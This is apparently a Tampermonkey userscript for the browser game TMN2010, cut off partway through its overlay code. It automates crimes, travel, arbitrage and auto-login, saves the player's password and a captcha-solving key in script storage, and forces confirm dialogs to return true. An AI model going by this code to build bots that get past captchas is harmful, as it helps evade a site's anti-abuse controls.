// ==UserScript==
// @name         TMN Mobile-All-in-One Script
// @namespace    http://tampermonkey.net/
// @version      1.6.12
// @description  Revised version with countdown fix and GTA/Crimes integration
// @author       Pap
// @license      MIT
// @match        https://*.tmn2010.net/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=tmn2010.net
// @grant        GM_xmlhttpRequest
// @grant        GM_getValue
// @grant        GM_setValue
// @grant        GM_registerMenuCommand
// @require      https://code.jquery.com/jquery-3.6.0.min.js
// @downloadURL https://update.greasyfork.org/scripts/556159/TMN%20Mobile-All-in-One%20Script.user.js
// @updateURL https://update.greasyfork.org/scripts/556159/TMN%20Mobile-All-in-One%20Script.meta.js
// ==/UserScript==


/*
    TODO

    Hide OC section when OC script disabled
    Car pref and leaderinputs not correctly loading on change, but do onload
    Auto banking


    */
(async function() {
    'use strict';

    const $ = window.jQuery;
    const page = location.href.toLowerCase();
    const TMN_CAPTCHA_KEY = GM_getValue('TMN_CAPTCHA_KEY', '');
    const TMN_PIC = 'Katana';
    const defaultPage = '/authenticated/default.aspx';
    const iFramePages = [ 'crimes.aspx', 'playerproperty.aspx?p=g&cleanup', 'jail.aspx', 'travel.aspx?d=', 'trade.aspx?autoarbitrage', 'credits.aspx?autoheal' ];

    GM_registerMenuCommand('Clear all data', () => {
        GM_setValue("TMN_ACTIVE_ARBITRAGE_OFFERS", '');
        GM_setValue("TMN_ARBITRAGE_INPUTS", '');
        GM_setValue("TMN_AUTO_OC_PREF", '');
        GM_setValue("TMN_BOOZE_TIME", '');
        //GM_setValue("TMN_CAPTCHA_KEY", '');
        GM_setValue("TMN_CAR_PREF", '');
        GM_setValue("TMN_CRIME_TIME", '');
        GM_setValue("TMN_EXPERIENCE", '');
        GM_setValue("TMN_FLIGHT_TIME", '');
        GM_setValue("TMN_GTA_TIME", '');
        GM_setValue("TMN_LAST_NEW_MAIL", '');
        GM_setValue("TMN_LEAD_OC_TYPE", '');
        GM_setValue("TMN_NEXT_DTM", '');
        GM_setValue("TMN_NEXT_FLIGHT", '');
        GM_setValue("TMN_NEXT_JET_FLIGHT", '');
        GM_setValue("TMN_NEXT_OC", '');
        GM_setValue("TMN_NEXT_TRAVEL", '');
        GM_setValue("TMN_OC_POSITION", '');
        GM_setValue("TMN_OVERLAY_ACCOUNT_SECTION_MINIMIZED", '');
        GM_setValue("TMN_OVERLAY_ARBITRAGE_SECTION_MINIMIZED", '');
        GM_setValue("TMN_OVERLAY_MINIMIZED", '');
        GM_setValue("TMN_OVERLAY_OC_SECTION_MINIMIZED", '');
        //GM_setValue("TMN_PASSWORD", '');
        GM_setValue("TMN_PLAYER", '');
        GM_setValue("TMN_SCRIPT_STATES", '');
        GM_setValue("TMN_SENTENCE_LENGTH", '');
        GM_setValue("TMN_LEAD_OC_INPUTS", '');
    });

    if (page.endsWith('trade.aspx')) {
        // Find the money offers table
        const table = document.querySelector('#ctl00_main_pnlMoneyOffers table');
        if (!table) return
        // Insert header cell
        const headerRow = table.querySelector('tr');
        const perCreditHeader = document.createElement('td');
        perCreditHeader.style.textAlign = 'center';
        perCreditHeader.textContent = 'Per Unit';
        headerRow.insertBefore(perCreditHeader, headerRow.children[4]); // after Return

        // Process each row
        [...table.querySelectorAll('tr')].slice(1).forEach(row => {
            const cells = row.children;
            const offerText = cells[2].textContent.replace(/[$,]/g, '');
            const returnText = cells[3].textContent.replace(/[^\d]/g, '');

            const offer = parseFloat(offerText);
            const ret = parseFloat(returnText);

            const perCredit = (!isNaN(offer) && !isNaN(ret) && ret > 0)
            ? Math.round(offer / ret).toLocaleString()
            : '';

            const td = document.createElement('td');
            td.style.textAlign = 'center';
            td.textContent = `$${perCredit}`;
            row.insertBefore(td, cells[4]); // after Return
        });

        // Find the credits offers table
        const creditTable = document.querySelector('#ctl00_main_pnlCreditOffers table');
        if (!creditTable) return;

        // Insert header cell
        const headerRow2 = creditTable.querySelector('tr');
        const perCreditHeader2 = document.createElement('td');
        perCreditHeader2.style.textAlign = 'center';
        perCreditHeader2.textContent = 'Per Unit';
        headerRow2.insertBefore(perCreditHeader2, headerRow2.children[4]); // after Return

        // Process each row
        [...creditTable.querySelectorAll('tr')].slice(1).forEach(row => {
            const cells = row.children;

            // Offer = “10 Credits”
            const offerCredits = parseFloat(
                cells[2].textContent.replace(/[^\d]/g, '')
            );

            // Return = “$11,000,000”
            const returnMoney = parseFloat(
                cells[3].textContent.replace(/[$,]/g, '')
            );

            const perCredit = (!isNaN(offerCredits) && !isNaN(returnMoney) && offerCredits > 0)
            ? Math.round(returnMoney / offerCredits).toLocaleString()
            : '';

            const td = document.createElement('td');
            td.style.textAlign = 'center';
            td.textContent = `$${perCredit}`;
            row.insertBefore(td, cells[4]); // after Return
        });


        $('[id$="btnTrade"]').each(function() {
            $(this).attr('onclick', "return confirm('Are you sure?');" );
        });
    } else {
        const script = document.createElement('script');
        script.textContent = 'window.confirm = () => true;';
        document.documentElement.appendChild(script);
    }
    if (page.includes('login.aspx')) DoLogin();
    if (page.endsWith(defaultPage)) MainSetup();
    //if (iFramePages.includes(page.split('/authenticated/')[1])) iFrameSetup();
    if (iFramePages.some(p => page.includes(p))) iFrameSetup();
    if (page.endsWith('jail.aspx')) JailScript();
    if (page.endsWith('crimes.aspx')) CrimesScript();
    if (page.endsWith('crimes.aspx?p=g')) GTAScript();
    if (page.endsWith('crimes.aspx?p=b')) BoozeScript();
    if (page.includes('mailbox.aspx') && page.includes('autoaccept')) AcceptInvites();
    if (page.endsWith('organizedcrime.aspx') || page.includes('organizedcrime.aspx?act=') || page.includes('store.aspx?p=w') ) OCScript();
    if (page.includes('organizedcrime.aspx?p=dtm')) DTMScript();
    if (page.includes('mailbox.aspx?p=s')) FreePhone();
    if (page.includes('trade.aspx?autoarbitrage')) AutoArbitrage();
    if (page.includes('playerproperty.aspx?a=')) AutoBank();
    if (page.includes('credits.aspx?autoheal')) AutoHeal();
    if (page.includes('travel.aspx?d=') && page.includes('&bb=true')) SpawnCampBullets();
    if (page.includes('travel.aspx?d=')) AutoTravel();
    if (page.endsWith('crimes.aspx?scriptcheck')) UniversalCaptchaSolve();
    if (page.includes('playerproperty.aspx?p=g&cleanup')) GarageCleanup();
    if (page.includes('store.aspx?p=b')) BFScript();
    if (page.includes('players.aspx')) TwentyFourFinder();
    if (page.includes('doubleup.aspx')) AutoDup();
    if (page.includes('statistics.aspx?p=p')) PapStats();

    // Run on all pages
    const lblMsg = $('#ctl00_lblMsg').text();
    if (lblMsg.includes('You are in jail! You will stay in for')) HandleJail();
    //if (!isFullHealth()) window.top.location.href = 'credits.aspx?autoheal'; return;

    (function AddOverlay() {
        if (window.self !== window.top) return;

        if (!$('#tmn-overlay').length) {
            // ---------------- DEFAULT STATES ----------------
            const defaultScriptStates = {
                Crimes: true,
                GTA: true,
                Booze: true,
                Jail: true,
                OC: false,
                DTM: false,
                'Auto Arbitrage': false,
                'Auto Bank': false,
                'Auto Heal': false,
                'Auto Login': false,
                'Auto Travel': false,
                'Spawn Camp Bullets': false
            };

            // Load saved values
            const savedScriptStates = Object.assign({}, defaultScriptStates, JSON.parse(GM_getValue('TMN_SCRIPT_STATES', '{}')));
            GM_setValue('TMN_SCRIPT_STATES', JSON.stringify(savedScriptStates));

            const overlayMinimized = GM_getValue('TMN_OVERLAY_MINIMIZED', false);
            const accountSectionMinimized = GM_getValue('TMN_OVERLAY_ACCOUNT_SECTION_MINIMIZED', false);
            const ocSectionMinimized = GM_getValue('TMN_OVERLAY_OC_SECTION_MINIMIZED', false);
            const arbitrageSectionMinimized  = GM_getValue('TMN_OVERLAY_ARBITRAGE_SECTION_MINIMIZED', false);
            const savedUsername = JSON.parse(GM_getValue('TMN_PLAYER', '{}'))?.name || '';
            const savedPassword = GM_getValue('TMN_PASSWORD', '');
            const savedCaptchaKey = GM_getValue('TMN_CAPTCHA_KEY', '');
            const savedAutoOCPref = GM_getValue('TMN_AUTO_OC_PREF', '');
            const savedLeadOCInputs = JSON.parse(GM_getValue('TMN_LEAD_OC_INPUTS', '{}'));
            const savedSpecificLeaderNames = GM_getValue('TMN_OC_LEADER_NAMES', '');
            const savedPosition = GM_getValue('TMN_OC_POSITION', '');
            const savedCarPref = GM_getValue('TMN_CAR_PREF', '');
            const savedArbitrageInputs = JSON.parse(GM_getValue('TMN_ARBITRAGE_INPUTS', '{}'));
            const offsetRight = $('.personalbtn').css('display') === 'inline-block' ? '67px' : '16px';

            // ---------------- OVERLAY CONTAINER ----------------
            const $overlay = $('<div>', { id: 'tmn-overlay' }).css({
                position: 'fixed', top: '10px', right: offsetRight, zIndex: 99999,
                background: 'rgba(20,28,40,0.96)', color: '#eee', fontFamily: 'monospace',
                fontSize: '14px', lineHeight: '1.7', padding: '16px 22px', borderRadius: '11px',
                boxShadow: '0 2px 14px #0008', maxWidth: '290px', maxHeight: '90vh',
                textAlign: 'left', boxSizing: 'border-box', overflowY: 'auto'
            });

            $('<style>').text(`
                #tmn-overlay::-webkit-scrollbar { width: 10px; }
                #tmn-overlay::-webkit-scrollbar-track { background: #1c1f26; border-radius: 11px; }
                #tmn-overlay::-webkit-scrollbar-thumb { background-color: #444; border-radius: 11px; border: 2px solid #1c1f26; }
                #tmn-overlay::-webkit-scrollbar-thumb:hover { background-color: #666; }
                #tmn-overlay input:not([type="checkbox"]), .overlay-menu {
                    width: 100%;
                    /*max-width: 230px;*/
                    box-sizing: border-box;
                }

                #ctl00_userInfo_lblUpdateTime {
                    color: yellow;
                    font-weight: bold;
                }
                `).appendTo('head');

            // ---------------- HEADER ----------------
            const $header = $('<div>').css({ display: 'flex', justifyContent: 'space-between', alignItems: 'center' })
            .html('<b>TMN All-in-One Config</b>');
            const $toggleBtn = $('<button>', { id: 'tmn-toggle-btn', text: overlayMinimized ? '+' : '–' }).css({
                background: 'none', border: 'none', color: '#eee', fontSize: '16px', cursor: 'pointer', marginLeft: '10px'
            });
            $header.append($toggleBtn);

            const $content = $('<div>', { id: 'tmn-overlay-content' }).css({ position: 'relative', display: overlayMinimized ? 'none' : 'block', marginTop: '8px' });

            // ---------------- ACCOUNT SECTION ----------------
            const $accountSection = $('<div>', { id: 'tmn-account-section' });
            const $accountSectionHeader = $('<div>').html('<b>Account Settings</b>').css({ display: 'flex', justifyContent: 'space-between', alignItems: 'center' });
            const $accountSectionToggleBtn = $('<button>', { id: 'tmn-account-section-toggle-btn', text: accountSectionMinimized ? '+' : '–' }).css({
                background: 'none', border: 'none', color: '#eee', fontSize: '16px', cursor: 'pointer', marginLeft: '10px'
            });
            $accountSectionHeader.append($accountSectionToggleBtn);

            const $accountSectionContent = $('<div>', { class: 'section-content' }).css({ marginTop: '8px', display: accountSectionMinimized ? 'none' : 'block' });

            const $usernameLabel = $('<label>', { html: `Username: <span style='color: #AA0000; font-weight: bold;'>${savedUsername}</span>` }).css({ display: 'block', margin: '6px 0 0 0', padding: 0 });

            const $passwordLabel = $('<label>', { text: 'Password:' }).css({ display: 'block', margin: '6px 0 0 0', padding: 0 });
            const $passwordInput = $('<input>', { type: 'password', id: 'password-input' }).val(savedPassword).css({
                background: '#2a2f3a', color: '#eee', border: '1px solid #444', borderRadius: '6px',
                padding: '6px', fontFamily: 'monospace', fontSize: '14px', margin: '4px 0 0 0', display: 'block'
            }).on('input', function () {
                GM_setValue('TMN_PASSWORD', $(this).val());
            });

            const $togglePasswordButton = $('<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="#ccc" viewBox="0 0 24 24"><path d="M12 5c-7.633 0-11 7-11 7s3.367 7 11 7 11-7 11-7-3.367-7-11-7zm0 12c-2.761 0-5-2.239-5-5 s2.239-5 5-5 5 2.239 5 5-2.239 5-5 5zm0-8c-1.657 0-3 1.343-3 3s1.343 3 3 3 3-1.343 3-3-1.343-3-3-3z"/></svg>')
            .css({ position: 'absolute', right: '8px', top: '55%', transform: 'translateY(-50%)', cursor: 'pointer' })
            .on('click', function () {
                const currentType = $passwordInput.attr('type');
                $passwordInput.attr('type', currentType === 'password' ? 'text' : 'password');
            });

            const $passwordWrapper = $('<div>').css({ position: 'relative', display: 'inline-block', width: '100%' }).append($passwordInput, $togglePasswordButton);

            const $captchaKeyLabel = $('<label>', { text: 'Captcha Key:' }).css({ display: 'block', margin: '6px 0 0 0', padding: 0 });
            const $captchaKeyInput = $('<input>', { type: 'text', id: 'captcha-key-input' }).val(savedCaptchaKey).css({
                background: '#2a2f3a', color: '#eee', border: '1px solid #444', borderRadius: '6px',
                padding: '6px', fontFamily: 'monospace', fontSize: '14px', margin: '4px 0 0 0', display: 'block'
            }).on('input', function () {
                GM_setValue('TMN_CAPTCHA_KEY', $(this).val());
            });

            $accountSectionContent.append($usernameLabel, $passwordLabel, $passwordWrapper, $captchaKeyLabel, $captchaKeyInput);
            $accountSection.append($accountSectionHeader, $accountSectionContent);

            // ---------------- OC SETTINGS ----------------
            const $ocSection = $('<div>', { id: 'tmn-oc-section' }).css({ display: savedScriptStates['OC'] ? 'block' : 'none' });
            const $ocSectionHeader = $('<div>').html('<b>OC Settings</b>').css({ display: 'flex', justifyContent: 'space-between', alignItems: 'center' });
            const $ocSectionToggleBtn = $('<button>', { id: 'tmn-oc-section-toggle-btn', text: ocSectionMinimized ? '+' : '–' }).css({
                background: 'none', border: 'none', color: '#eee', fontSize: '16px', cursor: 'pointer', marginLeft: '10px'
            });
            $ocSectionHeader.append($ocSectionToggleBtn);

            const $ocSectionContent = $('<div>', { class: 'section-content' }).css({ marginTop: '8px', display: ocSectionMinimized ? 'none' : 'block' });

            // Auto OC Dropdown
            const $autoOCLabel = $('<label>', { html: 'Auto OC:' }).css({ display: 'block', margin: '6px 0 0 0', padding: 0 });
            const $autoOCDropdown = $('<div>').css({ position: 'relative' });
            const $autoOCToggle = $('<div>', { text: savedAutoOCPref ? savedAutoOCPref + ' ▼' : 'Select OC Type ▼' }).css({
                background: '#2a2f3a', padding: '6px', borderRadius: '6px', cursor: 'pointer', border: '1px solid #444'
            });
            const $autoOCMenu = $('<div>', { class: 'overlay-menu' }).css({ display: 'none', position: 'absolute', background: '#1c1f26', border: '1px solid #444', padding: '8px', borderRadius: '6px', zIndex: 100000 });
            ['Auto Accept Any', 'Auto Accept Specific', 'Lead OC'].forEach(opt => {
                $autoOCMenu.append($('<div>', { text: opt, 'data-value': opt }).css({ padding: '4px 6px', cursor: 'pointer' }));
            });
            $autoOCDropdown.append($autoOCToggle, $autoOCMenu);

            // Specific Leader Names
            const $leaderNamesLabel = $('<label>', { text: 'Leader(s):' }).css({ display: savedAutoOCPref === 'Auto Accept Specific' ? 'block' : 'none', margin: '12px 0 0 0', padding: 0 });
            const $leaderNamesInput = $('<input>', { type: 'text' }).val(savedSpecificLeaderNames).css({
                background: '#2a2f3a', color: '#eee', border: '1px solid #444', borderRadius: '6px',
                padding: '6px', fontFamily: 'monospace', fontSize: '14px', margin: '4px 0 0 0',
                display: savedAutoOCPref === 'Auto Accept Specific' ? 'block' : 'none'
            }).on('input', function () {
                GM_setValue('TMN_OC_LEADER_NAMES', $(this).val());
            });

            // Position Dropdown
            const $positionLabel = $('<label>', { html: 'OC Position:' }).css({ display: (savedAutoOCPref === 'Auto Accept Any' || savedAutoOCPref === 'Auto Accept Specific') ? 'block' : 'none', margin: '12px 0 0 0', padding: 0 });
            const $positionDropdown = $('<div>').css({ position: 'relative', display: (savedAutoOCPref === 'Auto Accept Any' || savedAutoOCPref === 'Auto Accept Specific') ? 'block' : 'none' });
            const $positionToggle = $('<div>', { text: savedPosition ? savedPosition + ' ▼' : 'Select Position ▼' }).css({
                background: '#2a2f3a', padding: '6px', borderRadius: '6px', cursor: 'pointer', border: '1px solid #444'
            });
            const $positionMenu = $('<div>', { class: 'overlay-menu' }).css({ display: 'none', position: 'absolute', background: '#1c1f26', border: '1px solid #444', padding: '8px', borderRadius: '6px', zIndex: 100000 });
            ['TP', 'WM or EE', 'Any'].forEach(role => {
                $positionMenu.append($('<div>', { text: role, 'data-value': role }).css({ padding: '4px 6px', cursor: 'pointer' }));
            });
            $positionDropdown.append($positionToggle, $positionMenu);

            // Lead OC Type Dropdown
            const $ocTypeLabel = $('<label>', { html: 'OC Type:' }).css({ display: savedAutoOCPref === 'Lead OC' ? 'block' : 'none', margin: '12px 0 0 0', padding: 0 });
            const $ocTypeDropdown = $('<div>').css({ marginposition: 'relative', display: savedAutoOCPref === 'Lead OC' ? 'block' : 'none' });
            const $ocTypeToggle = $('<div>', { text: savedLeadOCInputs['Type'] ? savedLeadOCInputs['Type'] + ' ▼' : 'Select OC Type ▼' }).css({
                background: '#2a2f3a', padding: '6px', borderRadius: '6px', cursor: 'pointer', border: '1px solid #444'
            });
            const $ocTypeMenu = $('<div>', { class: 'overlay-menu' }).css({ display: 'none', position: 'absolute', background: '#1c1f26', border: '1px solid #444', padding: '8px', borderRadius: '6px', zIndex: 100000 });
            ['National Bank', 'Casino', 'Armoury'].forEach(type => {
                $ocTypeMenu.append($('<div>', { text: type, 'data-value': type }).css({ padding: '4px 6px', cursor: 'pointer' }));
            });
            $ocTypeDropdown.append($ocTypeToggle, $ocTypeMenu);

            // Leader Inputs
            const $leaderInputs = $('<div>').css({ marginTop: '12px', display: savedAutoOCPref === 'Lead OC' ? 'block' : 'none' });
            ['Transporter', 'Weapon Master', 'Explosive Expert'].forEach(role => {
                const key = role.toLowerCase().replace(/ /g, '');
                const $wrapper = $('<div>').css({ marginBottom: '8px' });
                const $label = $('<label>', { text: role + ':' }).css({ display: 'block', padding: 0, margin: 0 });
                const $input = $('<input>', { type: 'text' }).val(savedLeadOCInputs[key] || '').css({
                    background: '#2a2f3a', color: '#eee', border: '1px solid #444', borderRadius: '6px',
                    padding: '6px', fontFamily: 'monospace', fontSize: '14px'
                }).on('input', function () {
                    savedLeadOCInputs[key] = $(this).val();
                    GM_setValue('TMN_LEAD_OC_INPUTS', JSON.stringify(savedLeadOCInputs));
                });
                $wrapper.append($label, $input);
                $leaderInputs.append($wrapper);
            });

            // Car Preference Dropdown
            const $carPrefLabel = $('<label>', { html: 'Car Preference:' }).css({ display: ((savedPosition === 'TP' || savedPosition === 'Any') && (savedAutoOCPref === 'Auto Accept Any' || savedAutoOCPref === 'Auto Accept Specific')) ? 'block' : 'none', margin: '12px 0 0 0', padding: 0 });
            const $carDropdown = $('<div>').css({ position: 'relative', display: ((savedPosition === 'TP' || savedPosition === 'Any') && (savedAutoOCPref === 'Auto Accept Any' || savedAutoOCPref === 'Auto Accept Specific')) ? 'block' : 'none' });
            const $carToggle = $('<div>', { text: savedCarPref ? savedCarPref + ' ▼' : 'Select Car ▼' }).css({
                background: '#2a2f3a', padding: '6px', borderRadius: '6px', cursor: 'pointer', border: '1px solid #444'
            });
            const $carMenu = $('<div>', { class: 'overlay-menu' }).css({ display: 'none', position: 'absolute', background: '#1c1f26', border: '1px solid #444', padding: '8px', borderRadius: '6px', zIndex: 100000 });
            ['Audi RS6 Avant', 'Bentley Arnage', 'Worst-to-Best', 'Best-to-Worst'].forEach(car => {
                $carMenu.append($('<div>', { text: car, 'data-value': car }).css({ padding: '4px 6px', cursor: 'pointer' }));
            });
            $carDropdown.append($carToggle, $carMenu);

            // Append OC section
            $ocSectionContent.append($autoOCLabel, $autoOCDropdown, $leaderNamesLabel, $leaderNamesInput, $positionLabel, $positionDropdown, $ocTypeLabel, $ocTypeDropdown, $leaderInputs, $carPrefLabel, $carDropdown);
            $ocSection.append($ocSectionHeader, $ocSectionContent);

            // ---------------- ARBITRAGE SECTION ----------------
            const $arbitrageSection = $('<div>', { id: 'tmn-arbitrage-section' }).css({ display: savedScriptStates['Auto Arbitrage'] ? 'block' : 'none' });
            const $arbitrageSectionHeader = $('<div>').html('<b>Arbitrage Settings</b>').css({ display: 'flex', justifyContent: 'space-between', alignItems: 'center' });
            const $arbitrageSectionToggleBtn = $('<button>', { id: 'tmn-arbitrage-section-toggle-btn', text: arbitrageSectionMinimized ? '+' : '–' }).css({
                background: 'none', border: 'none', color: '#eee', fontSize: '16px', cursor: 'pointer', marginLeft: '10px'
            });
            $arbitrageSectionHeader.append($arbitrageSectionToggleBtn);

            const $arbitrageSectionContent = $('<div>', { class: 'section-content' }).css({ marginTop: '8px', display: arbitrageSectionMinimized ? 'none' : 'block' });

            const $moneyOnHandLabel = $('<label>', { text: 'Money on Hand ($):' }).css({ display: 'block', margin: '12px 0 0 0', padding: 0 });
            const $moneyOnHandInput = $('<input>', { type: 'number' }).val(savedArbitrageInputs['MoneyOnHand']).css({
                background: '#2a2f3a', color: '#eee', border: '1px solid #444', borderRadius: '6px',
                padding: '6px', fontFamily: 'monospace', fontSize: '14px', margin: '4px 0 0 0'
            }).on('input', function () {
                savedArbitrageInputs['MoneyOnHand'] = $(this).val();
                GM_setValue('TMN_ARBITRAGE_INPUTS', JSON.stringify(savedArbitrageInputs));
            });

            const $buyCreditsLabel = $('<label>', { text: 'Buy Credits ($ / #):' }).css({ display: 'block', margin: '12px 0 0 0', padding: 0 });
            const $buyCreditsPriceInput = $('<input>', { type: 'number' }).val(savedArbitrageInputs['BuyCreditsPrice']).css({
                background: '#2a2f3a', color: '#eee', border: '1px solid #444', borderRadius: '6px',
                padding: '6px', fontFamily: 'monospace', fontSize: '14px', maxWidth: '110px', margin: '4px 0 0 0'
            }).on('input', function () {
                savedArbitrageInputs['BuyCreditsPrice'] = $(this).val();
                GM_setValue('TMN_ARBITRAGE_INPUTS', JSON.stringify(savedArbitrageInputs));
            });

            const $buyCreditsQuantityInput = $('<input>', { type: 'number' }).val(savedArbitrageInputs['BuyCreditsQuantity']).css({
                background: '#2a2f3a', color: '#eee', border: '1px solid #444', borderRadius: '6px',
                padding: '6px', fontFamily: 'monospace', fontSize: '14px', maxWidth: '60px', margin: '4px 0 0 0'
            }).on('input', function () {
                savedArbitrageInputs['BuyCreditsQuantity'] = $(this).val();
                GM_setValue('TMN_ARBITRAGE_INPUTS', JSON.stringify(savedArbitrageInputs));
            });

            const $buyCreditsWrapper = $('<div>').css({ display: 'flex', justifyContent: 'space-between', alignItems: 'center', gap: '20px', maxWidth: '230px' }).append($buyCreditsPriceInput, $buyCreditsQuantityInput);

            const $sellCreditsLabel = $('<label>', { text: 'Sell Credits ($ / #):' }).css({ display: 'block', margin: '12px 0 0 0', padding: 0 });
            const $sellCreditsPriceInput = $('<input>', { type: 'number' }).val(savedArbitrageInputs['SellCreditsPrice']).css({
                background: '#2a2f3a', color: '#eee', border: '1px solid #444', borderRadius: '6px',
                padding: '6px', fontFamily: 'monospace', fontSize: '14px', maxWidth: '110px', margin: '4px 0 0 0'
            }).on('input', function () {
                savedArbitrageInputs['SellCreditsPrice'] = $(this).val();
                GM_setValue('TMN_ARBITRAGE_INPUTS', JSON.stringify(savedArbitrageInputs));
            });

            const $sellCreditsQuantityInput = $('<input>', { type: 'number' }).val(savedArbitrageInputs['SellCreditsQuantity']).css({
                background: '#2a2f3a', color: '#eee', border: '1px solid #444', borderRadius: '6px',
                padding: '6px', fontFamily: 'monospace', fontSize: '14px', maxWidth: '60px', margin: '4px 0 0 0'
            }).on('input', function () {
                savedArbitrageInputs['SellCreditsQuantity'] = $(this).val();
                GM_setValue('TMN_ARBITRAGE_INPUTS', JSON.stringify(savedArbitrageInputs));
            });

            const $sellCreditsWrapper = $('<div>').css({ display: 'flex', justifyContent: 'space-between', alignItems: 'center', gap: '20px', maxWidth: '230px' }).append($sellCreditsPriceInput, $sellCreditsQuantityInput);

            // Append Arbitrage section
            $arbitrageSectionContent.append($moneyOnHandLabel, $moneyOnHandInput, $buyCreditsLabel, $buyCreditsWrapper, $sellCreditsLabel, $sellCreditsWrapper);
            $arbitrageSection.append($arbitrageSectionHeader, $arbitrageSectionContent);

            // ---------------- SCRIPT TOGGLES ----------------
            const $scriptLabel = $('<label>', { html: 'Enabled Scripts:' }).css({ margin: '12px 0 0 0', padding: 0 })
            const $scriptDropdown = $('<div>', { id: 'script-dropdown' })/*.css({ position: 'relative' })*/;
            const $scriptToggle = $('<div>', { text: 'Select Scripts ▼' }).css({
                background: '#2a2f3a', padding: '6px', borderRadius: '6px', cursor: 'pointer', border: '1px solid #444'
            });
            const $scriptMenu = $('<div>', { class: 'overlay-menu' }).css({ display: 'none', position: 'absolute', background: '#1c1f26', border: '1px solid #444', padding: '8px', borderRadius: '6px', zIndex: 100000 });
            Object.keys(defaultScriptStates).forEach(script => {
                const $label = $('<label>').css({ display: 'block', margin: '0 0 4px 0' });
                const $checkbox = $('<input>', { type: 'checkbox', checked: savedScriptStates[script], 'data-script': script });
                $label.append($checkbox, ` ${script}`);
                $scriptMenu.append($label);
            });
            $scriptDropdown.append($scriptToggle, $scriptMenu);

            // Append all sections
            $content.append('<hr>', $accountSection, '<hr>', $ocSection, `<hr style='display: ${savedScriptStates['OC'] ? 'block' : 'none'}'>`, $arbitrageSection, `<hr style='display: ${savedScriptStates['Auto Arbitrage'] ? 'block' : 'none'}'>`, $scriptLabel, $scriptDropdown);
            $overlay.append($header, $content);
            $('body').append($overlay);

            // ---------------- EVENT HANDLERS ----------------
            // Toggle main overlay
            $('#tmn-toggle-btn').on('click', function () {
                const $content = $('#tmn-overlay-content');
                const isHidden = $content.css('display') === 'none';
                $content.css('display', isHidden ? 'block' : 'none');
                GM_setValue('TMN_OVERLAY_MINIMIZED', !isHidden);
                $(this).text(isHidden ? '–' : '+');
            });

            // Toggle section
            $(`[id$='-section-toggle-btn']`).on('click', function () {
                const $section = $(this).parent().parent();
                let gmValue = `TMN_OVERLAY_${$section.prop('id').split('tmn-')[1].split('-')[0].toUpperCase()}_SECTION_MINIMIZED`;
                let $content = $section.find('.section-content');
                let isHidden = $content.css('display') === 'none';
                $content.css('display', isHidden ? 'block' : 'none');
                GM_setValue(gmValue, !isHidden);
                $(this).text(isHidden ? '–' : '+');

                const $otherSections = $(`[id$='-section`).not($section);
                $otherSections.each(function() {
                    const $this = $(this);
                    gmValue = `TMN_OVERLAY_${$this.prop('id').split('tmn-')[1].split('-')[0].toUpperCase()}_SECTION_MINIMIZED`;
                    $content = $this.find('.section-content');
                    $content.css('display', 'none');
                    GM_setValue(gmValue, true);
                    $this.find('button').text('+');
                });
            });

            function toggleMenu($toggle, $menu) {
                const overlay = $('#tmn-overlay');
                const toggleOffset = $toggle.offset();
                const toggleHeight = $toggle.outerHeight();
                const menuHeight = $menu.outerHeight();
                const viewportHeight = $(window).height();
                const spaceBelow = viewportHeight - (toggleOffset.top + toggleHeight);
                const spaceAbove = toggleOffset.top;

                // Temporarily allow overflow
                overlay.css('overflow', 'visible');

                let positionCSS = {};

                if (spaceBelow >= menuHeight) {
                    // Enough space below → show below without overlap
                    positionCSS = {
                        //top: toggleHeight + 'px', // start right after button
                        bottom: 'auto',
                        maxHeight: 'unset',
                        overflowY: 'visible'
                    };
                } else if (spaceAbove >= menuHeight) {
                    // Enough space above → show above without overlap
                    positionCSS = {
                        top: 'auto',
                        bottom: toggleHeight + 'px', // start right above button
                        maxHeight: 'unset',
                        overflowY: 'visible'
                    };
                } else {
                    // Not enough space either way → constrain height and scroll
                    if (spaceBelow >= spaceAbove) {
                        positionCSS = {
                            //top: toggleHeight + 'px',
                            bottom: 'auto',
                            maxHeight: spaceBelow -18 + 'px',
                            overflowY: 'auto'
                        };
                    } else {
                        positionCSS = {
                            top: 'auto',
                            bottom: toggleHeight + 'px',
                            maxHeight: spaceAbove - 18 + 'px',
                            overflowY: 'auto'
                        };
                    }
                }

                $menu.css(positionCSS).toggle();
                CloseAllMenus($menu);
            }

            // Example usage for each dropdown:
            $autoOCToggle.on('click', function () { toggleMenu($autoOCToggle, $autoOCMenu); });
            $positionToggle.on('click', function () { toggleMenu($positionToggle, $positionMenu); });
            $ocTypeToggle.on('click', function () { toggleMenu($ocTypeToggle, $ocTypeMenu); });
            $carToggle.on('click', function () { toggleMenu($carToggle, $carMenu); });
            $scriptToggle.on('click', function () { toggleMenu($scriptToggle, $scriptMenu); });

            // Close menus and restore overflow
            /*$(document).on('click', function (e) {
                if (!$(e.target).closest('#tmn-overlay').length) {
                    $('[#tmn-overlay][id$="Menu"]').hide();
                    $('#tmn-overlay').css('overflow-y', 'auto');
                }
            });*/

            // $(`[id$='-toggle']`).on('click', function () {
            //     alert();
            //     const $menu = $(this).next();
            //     const toggleOffset = $(this).parent().offset();
            //     const menuHeight = $menu.outerHeight();
            //     const viewportHeight = $(window).height();
            //     const overlayHeight = $('#tmn-overlay').height();
            //     const toggleHeight = $(this).outerHeight();
            //     const spaceBelow = viewportHeight - (toggleOffset.top + toggleHeight);
            //     const spaceAbove = toggleOffset.top;
            //     const $overlay = $('#tmn-overlay');

            //     CloseAllMenus($menu[0]);
            //     if (spaceBelow < menuHeight) {
            //         $menu.css({
            //             maxHeight: `${spaceAbove}px`,
            //             top: 'auto',
            //             bottom: `${toggleHeight}px`
            //         });
            //     } else {
            //         //$overlay.css({ overflowY: 'unset' });
            //         $menu.css({
            //             maxHeight: 'unset',
            //             bottom: 'auto'
            //         });
            //     }

            //     $menu.toggle();
            // });

            function CloseAllMenus(except) {
                $(`[class$='overlay-menu']`).each((i, menu) => {
                    if (menu !== except[0]) $(menu).hide();
                });
            }


            // Auto OC selection logic
            $autoOCMenu.find('div').on('click', function () {
                const value = $(this).data('value') || $(this).text();
                $autoOCToggle.text(value + ' ▼');
                GM_setValue('TMN_AUTO_OC_PREF', value);
                $autoOCMenu.hide();

                // Update visibility based on selection
                $leaderNamesLabel.css('display', value === 'Auto Accept Specific' ? 'block' : 'none');
                $leaderNamesInput.css('display', value === 'Auto Accept Specific' ? 'block' : 'none');
                $positionLabel.css('display', (value === 'Auto Accept Any' || value === 'Auto Accept Specific') ? 'block' : 'none');
